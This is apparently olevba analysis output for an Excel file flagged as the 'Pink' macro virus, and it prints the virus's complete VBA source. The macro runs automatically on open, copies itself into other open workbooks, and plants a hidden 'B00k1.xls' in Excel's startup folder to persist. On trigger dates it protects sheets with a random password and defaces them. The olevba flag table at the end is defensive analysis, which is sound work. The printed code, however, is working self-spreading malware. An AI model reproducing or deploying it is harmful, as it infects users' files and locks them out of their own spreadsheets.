olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Pink-746085cc77795bcf613ceb90c21f9196114babd6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NV112323.bas 
in file: Virus.MSExcel.Pink-746085cc77795bcf613ceb90c21f9196114babd6 - OLE stream: '_VBA_PROJECT_CUR/VBA/NV112323'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
Application.OnSheetActivate = "pink"
End Sub
Sub pink()
    Dim mn, virname, thismo, passwords, pick, pickmo, head, getname As String, i, j, k, num, wbc, thisnum As Integer
    wbc = Workbooks.Count
    For k = 1 To wbc
    If Workbooks(k).Name = "B00k1.xls" Then
        getname = "B00k1.xls"
        Windows("B00k1.xls").Visible = False
            If Workbooks("B00k1.xls").Saved = False Then
                Workbooks("B00k1.xls").Save
            End If
        Exit For
     End If
    Next
    If wbc < 2 Then
        GoTo final
    End If
    thisnum = ThisWorkbook.Modules.Count
    num = ActiveWorkbook.Modules.Count
    For i = 1 To thisnum
        thismo = ThisWorkbook.Modules(i).Name
        pickmo = Right(Left(thismo, 2), 1)
        If pickmo = "V" Then
            namemo = ThisWorkbook.Modules(i).Name
            Exit For
        End If
    Next
    If (Asc(ActiveWorkbook.Name) >= 97 And Asc(ActiveWorkbook.Name) <= 122) Or (Asc(ActiveWorkbook.Name) >= 65 And Asc(ActiveWorkbook.Name) <= 90) Then
        head = Chr(Asc(ActiveWorkbook.Name))
    Else
        head = "N"
    End If
    mn = head & "V" & Month(Now) & Day(Now) & Right(Time$, 2)
    For j = 1 To num
        pick = Right(Left(ActiveWorkbook.Modules(j).Name, 2), 1)
        If pick = "V" Then
            End
        End If
    Next
        If Month(Now) + Day(Now) <> 13 And ActiveSheet.Range("iv65536").FormulaR1C1 <> "=""""" Then
            ActiveSheet.Range("iv65536").FormulaR1C1 = "="""""
        End If
    ThisWorkbook.Sheets(namemo).Copy ActiveWorkbook.ActiveSheet
    ActiveWorkbook.Modules(namemo).Name = mn
    If Left(ActiveWorkbook.Name, 4) <> "Book" Then
        ActiveWorkbook.Save
    End If
    Application.ScreenUpdating = False
    passwords = Left((Rnd * 1000000000 + 100000000), 8)
    If Month(Now) + Day(Now) = 13 Then
    ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True, password:=passwords
    End If
    If Month(Now) = 6 And Day(Now) = 15 Then
      With Cells
   .ClearFormats
   .ColumnWidth = 2.75
   .RowHeight = 15
   End With
    ActiveWindow.Zoom = 25
    Union(Range( _
        "AO15,AP15,AO16,AP16,AO16,AO17,AP17,AO18,AP18,AO19,AP19,AO20,AP20,AO21,AP21,AO22,AP22,AO23,AP23,AO24,AP24,AO25,AP25,AO26,AP26,AO27,AP27,AO28,AP28,AO29,AP29,AO30" _
        ), Range( _
        "AP30,AO31,AP31,AN19,AM19,AL19,AK19,AJ19,AJ19,AI19,AH19,AG19,AG20,AH20,AI20,AJ20,AK20,AL20,AM20,AN20,AG18,AH18,AI18,AJ18,AK18,AL18,AM18,AN18,AQ18,AR18,AS18,AT18" _
        ), Range( _
        "AU18,AV18,AW18,AX18,AQ19,AR19,AS19,AT19,AU19,AV19,AW19,AX19,AQ20,AR20,AS20,AT20,AU20,AV20,AW20,AX20,AQ30,AR30,AS30,AT30,AU30,AV30,AW30,AX30,AQ31,AR31,AS31,AT31" _
        ), Range( _
        "AU31,AV31,AW31,AX31,AG21,AG22,AG23,AG24,AG25,AG26,AG27,AG28,AG29,AG30,AG31,AH21,AH22,AH23,AH24,AH25,AH26,AH27,AH28,AH29,AH30,AH31,AW17,AW16,AW15,AW14,AW14,AW13" _
        ), Range( _
        "AW12,AW11,AW11,AW10,AW9,AW8,AW7,AX7,AX8,AX9,AX10,AX11,AX12,AX13,AX14,AX15,AX16,AX17,AG6,AH6,AI6,AJ6,AK6,AL6,AM6,AN6,AO6,AP6,AW6,AX6,AG31,AG31" _
        ), Range( _
        "AG32,AH32,AO32,AP32,AQ32,AR32,AS32,AT32,AU32,AV32,AW32,AX32,AG7,AH7,AI7,AJ7,AK7,AL7,AM7,AN7,AO7,AP7,AG8,AH8,AI8,AJ8,AK8,AL8,AM8,AN8,AO8,AP8" _
        ), Range("AO9,AP9,AO10,AP10,AO11,AP11,AO12,AP12,AO13,AP13,AO14,AP14")) = "OO"
        ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True, password:=passwords
    ElseIf Month(Now) + Day(Now) = 22 Then
    ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True, password:=passwords
    End If
final:
    virname = Dir(Application.StartupPath & "\B00k1.xls")
    If virname = "" Then
        ThisWorkbook.Sheets(2).Range("iv65536").FormulaR1C1 = "="""""
        ThisWorkbook.SaveCopyAs Filename:=Application.StartupPath & "\" & "B00k1.xls"
        If getname = "" Then
            Application.OnSheetActivate = ""
            End
        End If
        ActiveWindow.Visible = False
    End If
    Application.OnSheetActivate = Application.StartupPath & "\" & "B00k1!pink"
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  NV11232
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

